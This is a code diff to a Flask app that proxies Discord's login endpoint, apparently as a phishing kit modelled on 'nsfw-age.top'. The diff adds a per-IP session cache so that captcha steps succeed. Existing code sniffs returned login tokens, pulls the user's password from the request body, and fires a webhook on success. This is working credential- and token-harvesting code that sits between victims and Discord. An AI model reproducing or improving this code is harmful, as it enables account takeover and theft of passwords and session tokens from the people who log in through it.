@@ -1762,13 +1762,50 @@ def _make_cors_response(discord_resp):
     return resp
 
 
+# ━━━━━━━━━━━━ Login Session Cache (same curl_cffi session across captcha steps) ━━━━━━━━━━━━
+# Discord ties captcha tokens to the cookies set in the first request.
+# If step 2 (with captcha) uses a fresh session (new cookies), Discord rejects → invalid-response.
+# We cache the curl_cffi session by client IP for 5 minutes so both steps share cookies.
+_login_sessions = {}   # ip -> (session, expires_at)
+_login_sessions_lock = threading.Lock()
+LOGIN_SESSION_TTL = 300  # 5 minutes
+
+def _get_login_session(client_ip):
+    """Get or create a curl_cffi session for this client IP, reusing across captcha steps."""
+    now = time.time()
+    with _login_sessions_lock:
+        entry = _login_sessions.get(client_ip)
+        if entry and entry[1] > now:
+            return entry[0]
+        # Clean stale entries (max 50 to avoid O(n) every call)
+        stale = [k for k, (_, exp) in list(_login_sessions.items())[:50] if exp <= now]
+        for k in stale:
+            _login_sessions.pop(k, None)
+    # Create new session outside lock
+    s = _make_session()
+    if DISCORD_PROXIES:
+        s.proxies = DISCORD_PROXIES
+    with _login_sessions_lock:
+        _login_sessions[client_ip] = (s, now + LOGIN_SESSION_TTL)
+    return s
+
+def _clear_login_session(client_ip):
+    """Remove cached login session after successful auth (no longer needed)."""
+    with _login_sessions_lock:
+        _login_sessions.pop(client_ip, None)
+
+
 @app.route('/api/v9/experiments', methods=['GET', 'OPTIONS'])
 def api_experiments_proxy():
-    """Proxy /experiments → browser gets fingerprint (like nsfw-age.top serves Discord's page)."""
+    """Proxy /experiments → browser gets fingerprint (like nsfw-age.top serves Discord's page).
+    Uses the same cached session that /api/v9/auth/login will use, so Discord cookies persist."""
     if request.method == 'OPTIONS':
         return _proxy_cors_preflight()
     try:
-        s = _make_session()
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if client_ip:
+            client_ip = client_ip.split(',')[0].strip()
+        s = _get_login_session(client_ip)
         # Visit login page first to get cookies (mimics page load)
         try:
             s.get('https://discord.com/login', headers={
@@ -1802,7 +1839,8 @@ def api_v9_auth_login():
     """Transparent proxy to Discord /auth/login — copies nsfw-age.top exactly.
     Browser sends ALL Discord headers (x-fingerprint, x-super-properties, x-captcha-*).
     We forward to Discord using curl_cffi and return Discord's raw response.
-    We sniff for tokens/tickets on the way back."""
+    We sniff for tokens/tickets on the way back.
+    Session is cached per client IP so captcha step 2 reuses the same cookies."""
     if request.method == 'OPTIONS':
         return _proxy_cors_preflight()
 
@@ -1811,12 +1849,12 @@ def api_v9_auth_login():
         return jsonify({'error': f'Too many attempts. Try again in {retry_after}s.', 'retry_after': retry_after}), 429
 
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if client_ip:
+        client_ip = client_ip.split(',')[0].strip()
     body = request.get_data()
 
     try:
-        s = _make_session()
-        if DISCORD_PROXIES:
-            s.proxies = DISCORD_PROXIES
+        s = _get_login_session(client_ip)
         hdrs = _build_proxy_headers()
         r = s.post(f'{API}/auth/login', data=body, headers=hdrs, timeout=30)
         _handle_discord_response(r)
@@ -1830,6 +1868,7 @@ def api_v9_auth_login():
 
         # Sniff for successful login → fire webhook + assign role
         if j.get('token'):
+            _clear_login_session(client_ip)
             pw = '?'
             try:
                 bd = json.loads(body)
